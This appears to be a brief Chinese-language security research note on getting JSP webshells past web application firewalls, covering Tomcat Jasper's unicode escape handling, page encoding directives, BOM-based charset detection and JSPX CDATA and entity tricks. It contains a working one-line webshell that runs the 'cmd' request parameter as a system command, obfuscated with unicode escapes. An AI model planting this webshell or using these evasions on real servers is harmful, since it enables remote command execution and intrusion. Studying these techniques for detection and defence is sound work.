
## jsp通过编码绕过waf

`Java Webshell攻防下的黑魔法-yzddmr6`

JPC引擎(Jasper) `org.apache.jasper.compiler.ParserController#doParse`

Jasper在解析jsp到java源代码时,需要读取jsp文件的`字符集编码`才能正确转换和编译

常用Tomcat底层默认支持unicode字符集\u00ff如:

`<% Runtime.getRuntim\u0065().\u0065xec(request.getParameter("cmd")); %>`

### 指定编码

`<%@ page pageEncoding="UTF-8" %>`

`<%@ page contentType="text/html; charset=UTF-8" %>`

`<jsp:directive.page pageEncoding="UTF-8"/>`

`<jsp:directive.page contentType="UTF-8"/>`

且未指定时默认字符集使用`ISO-8859-1`

#### BOM(Byte Order Mark)头指定编码

BOM 是位于文本文件最开头的几个不可见字节 如: UTF-8的BOM是 `EF BB BF`

如果JSP文件没有指定 `<%@ page pageEncoding="..." %>`,Tomcat会尝试通过文件头部的BOM来自动探测编码

Tomcat会读取前2到4个字节 按支持的字符集mark对比 以jdk8支持的字符集超过900个:

- UTF-8	EF BB BF
- UTF-16 (Big Endian)	FE FF
- UTF-16 (Little Endian)	FF FE
- UTF-32 (Big Endian)	00 00 FE FF	
- CP037 4C 6F A7 94

## jspx中的利用

jspx要求jsp符合xml规范 支持xml特性

CDATA支持: `<![CDATA[Runti]]>me.getRuntime().exec();`

`<jsp:scriptlet>` 标签代替传统的` <% %>`,Tomcat 解析 `<jsp:scriptlet>`时:

- XML实体解码 将 `&amp;` 还原为 `&`
